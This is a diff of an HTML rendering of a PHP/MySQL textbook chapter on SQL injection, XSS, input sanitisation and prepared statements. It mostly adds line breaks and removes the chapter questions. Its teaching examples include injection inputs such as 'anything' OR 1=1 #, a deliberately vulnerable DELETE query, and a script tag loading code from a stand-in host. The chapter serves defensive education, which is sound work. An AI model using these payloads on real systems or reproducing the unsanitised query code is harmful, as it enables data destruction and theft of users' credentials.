 <span>$user</span>
 <span>(and</span>
 <span>doesn&rsquo;t even enter anything for</span>
 <span>$pass</span>
 <span>)?</span>
+<br/>
 <span>admin' #</span>
+<br/>
 <span>Let&rsquo;s look at the string that would be sent to MySQL:</span>
+<br/>
 <span>SELECT * FROM users WHERE user='admin' #' AND pass=''</span>
+<br/>
 <span>Do you see the problem there? In MySQL, the</span>
 <span>#</span>
 <span>symbol represents the start of a com‐</span>
@@ -1277,25 +1405,33 @@ layout: default
 <span>),</span>
 <span>without having to enter a password. In the following, the part of the query that will be</span>
 <span>executed is shown in bold; the rest will be ignored.</span>
+<br/>
 <span>SELECT * FROM users WHERE user='admin' #</span>
 <span>' AND pass=''</span>
+<br/>
 <span>But you should count yourself very lucky if that&rsquo;s all a malicious user does to you. At</span>
 <span>least you might still be able to go into your application and undo any changes the user</span>
 <span>makes as</span>
 <span>admin</span>
 <span>. But what about the case in which your application code removes a</span>
 <span>user from the database? The code might look something like this:</span>
+<br/>
 <span>$user = $_POST['user'];</span>
 <span>$pass = $_POST['pass'];</span>
 <span>$query = "DELETE FROM users WHERE user='$user' AND pass='$pass'";</span>
+<br/>
 <span>Again, this looks quite normal at first glance, but what if someone entered the follow‐</span>
 <span>ing for</span>
 <span>$user</span>
 <span>?</span>
+<br/>
 <span>anything' OR 1=1 #</span>
+<br/>
 <span>This would be interpreted by MySQL as follows:</span>
+<br/>
 <span>DELETE FROM users WHERE user='anything' OR 1=1 #</span>
 <span>' AND pass=''</span>
+<br/>
 <span>Ouch&mdash;that SQL query will always be</span>
 <span>TRUE</span>
 <span>, and therefore you&rsquo;ve lost your whole</span>
@@ -1312,6 +1448,7 @@ layout: default
 <span>in order to put their own security code in place. So there is no guarantee that this</span>
 <span>hasn&rsquo;t happened on the server you are working on. In fact, the feature was deprecated</span>
 <span>as of PHP 5.3.0 and has been removed in PHP 6.0.0.</span>
+<br/>
 <span>Instead, you should always use the</span>
 <span>real_escape_string</span>
 <span>method for all calls to</span>
@@ -1319,7 +1456,9 @@ layout: default
 <span>Example 10-16</span>
 <span>is a function you can use that will remove any magic quotes</span>
 <span>added to a user-inputted string and then properly sanitize it for you.</span>
+<br/>
 <span>Example 10-16. How to properly sanitize user input for MySQL</span>
+<br/>
 <span>&lt;?php</span>
 <span>function mysql_fix_string($conn, $string)</span>
 <span>{</span>
@@ -1327,6 +1466,7 @@ layout: default
 <span>return $conn-&gt;real_escape_string($string);</span>
 <span>}</span>
 <span>?&gt;</span>
+<br/>
 <span>The</span>
 <span>get_magic_quotes_gpc</span>
 <span>function returns</span>
@@ -1347,7 +1487,9 @@ layout: default
 <span>incorporate</span>
 <span>mysql_fix_string</span>
 <span>within your own code.</span>
+<br/>
 <span>Example 10-17. How to safely access MySQL with user input</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1362,6 +1504,7 @@ layout: default
 <span>return $conn-&gt;real_escape_string($string);</span>
 <span>}</span>
 <span>?&gt;</span>
+<br/>
 <span>These precautions are becoming less important, however, because</span>
 <span>there&rsquo;s a much easier and safer way to access MySQL, which obvi‐</span>
 <span>ates the need for these types of functions, and that&rsquo;s the use of pla‐</span>
@@ -1371,13 +1514,17 @@ layout: default
 <span>ferred to the database, without the possibility of user-submitted (or other) data being</span>
 <span>interpreted as MySQL statements (and the potential for hacking that could then</span>
 <span>result).</span>
+<br/>
 <span>It works by requiring you to first prepare the statement you wish to be executed in</span>
 <span>MySQL, but leave all the parts of the statement that refer to data as simple question</span>
 <span>marks.</span>
+<br/>
 <span>In plain MySQL, prepared statements look like</span>
 <span>Example 10-18</span>
 <span>.</span>
+<br/>
 <span>Example 10-18. MySQL placeholders</span>
+<br/>
 <span>PREPARE statement FROM "INSERT INTO classics VALUES(?,?,?,?,?)";</span>
 <span>SET @author = "Emily Bront&euml;",</span>
 <span>@title = "Wuthering Heights",</span>
@@ -1386,6 +1533,7 @@ layout: default
 <span>@isbn = "9780553212587";</span>
 <span>EXECUTE statement USING @author,@title,@category,@year,@isbn;</span>
 <span>DEALLOCATE PREPARE statement;</span>
+<br/>
 <span>This can be cumbersome to submit to MySQL, so the mysqli extension makes han‐</span>
 <span>dling placeholders easier for you with a ready-made method called</span>
 <span>prepare</span>
@@ -1398,7 +1546,9 @@ layout: default
 <span>then used for sending the data to the server in place of the question marks. It&rsquo;s first</span>
 <span>use is to bind some PHP variables to each of the question marks (the placeholder</span>
 <span>parameters) in turn, like this:</span>
+<br/>
 <span>$stmt-&gt;bind_param('sssss', $author, $title, $category, $year, $isbn);</span>
+<br/>
 <span>The first argument to</span>
 <span>bind_param</span>
 <span>is a string representing the type of each of the</span>
@@ -1406,49 +1556,66 @@ layout: default
 <span>s</span>
 <span>characters, representing strings,</span>
 <span>but any combination of types can be specified here, out of the following:</span>
+<br/>
 <span>i</span>
 <span>The data is an integer.</span>
+<br/>
 <span>d</span>
 <span>The data is a double.</span>
+<br/>
 <span>s</span>
 <span>The data is a string.</span>
 <span>b</span>
 <span>The data is a BLOB (and will be sent in packets).</span>
+<br/>
 <span>With the variables bound to the prepared statement, it is now necessary to populate</span>
 <span>these variables with the data to be passed to MySQL, like this:</span>
+<br/>
 <span>$author = 'Emily Bront&euml;';</span>
 <span>$title = 'Wuthering Heights';</span>
 <span>$category = 'Classic Fiction';</span>
 <span>$year = '1847';</span>
 <span>$isbn = '9780553212587';</span>
+<br/>
 <span>At this point, PHP now has everything it needs in order to execute the prepared state‐</span>
 <span>ment, so we issue the following command, which calls the</span>
 <span>execute</span>
 <span>method of the</span>
 <span>$stmt</span>
 <span>object earlier created:</span>
+<br/>
 <span>$stmt-&gt;execute();</span>
+<br/>
 <span>Before going any further, it makes sense to next check whether the command was</span>
 <span>executed successfully, so here&rsquo;s how you can do that by checking the</span>
 <span>affected_rows</span>
 <span>property of</span>
 <span>$statement</span>
 <span>:</span>
+<br/>
 <span>printf("%d Row inserted.\n", $stmt-&gt;affected_rows);</span>
+<br/>
 <span>In the preceding example, there should be notification of one row inserted.</span>
+<br/>
 <span>Once you are happy that the statement executed successfully (or you have otherwise</span>
 <span>dealt with any errors), you can close the</span>
 <span>$stmt</span>
 <span>object, like this:</span>
+<br/>
 <span>$stmt-&gt;close();</span>
+<br/>
 <span>And finally, close the</span>
 <span>$conn</span>
 <span>object (assuming you have finished with it too), like this:</span>
+<br/>
 <span>$conn-&gt;close();</span>
+<br/>
 <span>When you put all this together, the result is</span>
 <span>Example 10-19</span>
 <span>.</span>
+<br/>
 <span>Example 10-19. Issuing prepared statements</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1465,6 +1632,7 @@ layout: default
 <span>$stmt-&gt;close();</span>
 <span>$conn-&gt;close();</span>
 <span>?&gt;</span>
+<br/>
 <span>Every time you are able to use prepared statements in place of nonprepared, you will</span>
 <span>be closing a potential security hole, so it&rsquo;s worth spending the time getting to know</span>
 <span>how to use them.</span>
@@ -1476,26 +1644,32 @@ layout: default
 <span>, also referred to as</span>
 <span>XSS</span>
 <span>.</span>
+<br/>
 <span>This occurs when you allow HTML, or more often JavaScript code, to be input by a</span>
 <span>user and then displayed back by your website. One place this is common is in a com‐</span>
 <span>ment form. What happens most often is that a malicious user will try to write code</span>
 <span>that steals cookies from your site&rsquo;s users, allowing him or her to discover username</span>
 <span>and password pairs or other information. Even worse, the malicious user might</span>
 <span>launch an attack to download a Trojan onto a user&rsquo;s computer.</span>
+<br/>
 <span>But preventing this is as simple as calling the</span>
 <span>htmlentities</span>
 <span>function, which strips</span>
 <span>out all HTML markup codes and replaces them with a form that displays the charac‐</span>
 <span>ters, but does not allow a browser to act on them. For example, consider this HTML:</span>
+<br/>
 <span>&lt;script src='http://x.com/hack.js'&gt;</span>
 <span>&lt;/script&gt;&lt;script&gt;hack();&lt;/script&gt;</span>
+<br/>
 <span>This code loads in a JavaScript program and then executes malicious functions. But if</span>
 <span>it is first passed through</span>
 <span>htmlentities</span>
 <span>, it will be turned into the following totally</span>
 <span>harmless string:</span>
+<br/>
 <span>&amp;lt;script src='http://x.com/hack.js'&amp;gt; &amp;lt;/script&amp;gt;</span>
 <span>&amp;lt;script&amp;gt;hack();&amp;lt;/script&amp;gt;</span>
+<br/>
 <span>Therefore, if you are ever going to display anything that your users enter, either</span>
 <span>immediately or after storing it in a database, you need to first sanitize it using the</span>
 <span>htmlentities</span>
@@ -1503,7 +1677,9 @@ layout: default
 <span>the first one in</span>
 <span>Example 10-20</span>
 <span>, which can sanitize for both SQL and XSS injections.</span>
+<br/>
 <span>Example 10-20. Functions for preventing both SQL and XSS injection attacks</span>
+<br/>
 <span>&lt;?php</span>
 <span>function mysql_entities_fix_string($conn, $string)</span>
 <span>{</span>
@@ -1515,6 +1691,7 @@ layout: default
 <span>return $conn-&gt;real_escape_string($string);</span>
 <span>}</span>
 <span>?&gt;</span>
+<br/>
 <span>The</span>
 <span>mysql_entities_fix_string</span>
 <span>function first calls</span>
@@ -1529,7 +1706,9 @@ layout: default
 <span>shows your new &ldquo;ultimate protection&rdquo; version of</span>
 <span>Example 10-17</span>
 <span>.</span>
+<br/>
 <span>Example 10-21. How to safely access MySQL and prevent XSS attacks</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1551,27 +1730,40 @@ layout: default
 <h3>Using mysqli Procedurally</h3>
 <span>If you prefer, there is an alternative set of functions you can use to access mysqli in a</span>
 <span>procedural (rather than object-oriented) manner.</span>
+<br/>
 <span>So, instead of creating a</span>
 <span>$conn</span>
 <span>object like this:</span>
+<br/>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
+<br/>
 <span>You can use the following:</span>
+<br/>
 <span>$link = mysqli_connect($hn, $un, $pw, $db);</span>
+<br/>
 <span>To check that the connection has been made and handle it, you could use code such</span>
 <span>as this:</span>
+<br/>
 <span>if (mysqli_connect_errno()) die(mysqli_connect_error());</span>
+<br/>
 <span>And to make a MySQL query, you would use code such as the following:</span>
+<br/>
 <span>$result = mysqli_query($link, "SELECT * FROM classics");</span>
+<br/>
 <span>Upon return,</span>
 <span>$result</span>
 <span>will contain the data. You can find out the number of rows</span>
 <span>returned as follows:</span>
+<br/>
 <span>$rows = mysqli_num_rows($result);</span>
+<br/>
 <span>An integer is returned in</span>
 <span>$rows</span>
 <span>. You can fetch the actual data one row at a time in the</span>
 <span>following way, which returns a numeric array:</span>
+<br/>
 <span>$row = mysqli_fetch_array($result, MYSQLI_NUM);</span>
+<br/>
 <span>In this instance,</span>
 <span>$row[0]</span>
 <span>will contain the first column of data,</span>
@@ -1581,23 +1773,38 @@ layout: default
 <span>&nbsp;Example 11-5</span>
 <span>, rows can also be returned as associative</span>
 <span>arrays or as both types, depending on the value passed in the second argument.</span>
+<br/>
 <span>When you need to know the insert ID of an insert operation, you can always call the</span>
 <span>mysqli_insert_id</span>
 <span>function, like this:</span>
+<br/>
 <span>$insertID = mysqli_insert_id($result);</span>
+<br/>
 <span>Escaping strings procedurally with mysqli is as easy as using the following:</span>
+<br/>
 <span>$escaped = mysqli_real_escape_string($link, $val);</span>
+<br/>
 <span>To prepare a statement with mysqli is as simple as this:</span>
+<br/>
 <span>$stmt = mysqli_prepare($link, 'INSERT INTO classics VALUES(?,?,?,?,?)');</span>
+<br/>
 <span>To bind variables to the prepared statement, you would then use the following:</span>
+<br/>
 <span>mysqli_stmt_bind_param($stmt, 'sssss', $author, $title, $category, $year, $isbn);</span>
+<br/>
 <span>And to execute the prepared statement after assigning the variables with the required</span>
 <span>values, you would issue this call:</span>
+<br/>
 <span>mysqli_stmt_execute($stmt);</span>
+<br/>
 <span>To close a statement, issue the following command:</span>
+<br/>
 <span>mysqli_stmt_close($stmt);</span>
+<br/>
 <span>And to close the connection to MySQL, enter this command:</span>
+<br/>
 <span>mysqli_close($link);</span>
+<br/>
 <span>For complete details on using prepared statements (procedurally or</span>
 <span>otherwise), check out</span>
 <span>tinyurl.com/mysqlistmt</span>
@@ -1605,42 +1812,7 @@ layout: default
 <span>on all aspects of mysqli, visit</span>
 <span>tinyurl.com/usingmysqli</span>
 <span>.</span>
+<br/>
 <span>Now that you have learned how to integrate PHP with MySQL in several different</span>
 <span>ways, the next chapter moves on to creating user-friendly forms and dealing with the</span>
 <span>data submitted from them.</span>
-<h3>Questions</h3>
-<span>1.</span>
-<span>How do you connect to a MySQL database using</span>
-<span>mysqli</span>
-<span>?</span>
-<span>2.</span>
-<span>How do you submit a query to MySQL using</span>
-<span>mysqli</span>
-<span>?</span>
-<span>3.</span>
-<span>How can you retrieve a string containing an error message when a</span>
-<span>mysqli</span>
-<span>error</span>
-<span>occurs?</span>
-<span>4.</span>
-<span>How can you determine the number of rows returned by a</span>
-<span>mysqli</span>
-<span>query?</span>
-<span>5.</span>
-<span>How can you retrieve a particular row of data from a set of</span>
-<span>mysqli</span>
-<span>results?</span>
-<span>6.</span>
-<span>Which</span>
-<span>mysqli</span>
-<span>method can be used to properly escape user input to prevent code</span>
-<span>injection?</span>
-<span>7.</span>
-<span>What negative effects can happen if you do not close the objects created by</span>
-<span>mysqli</span>
-<span>methods?</span>
-<span>See</span>
-<span>Chapter 10 Answers</span>
-<span>in</span>
-<span>Appendix A</span>
-<span>for the answers to these questions.</span>
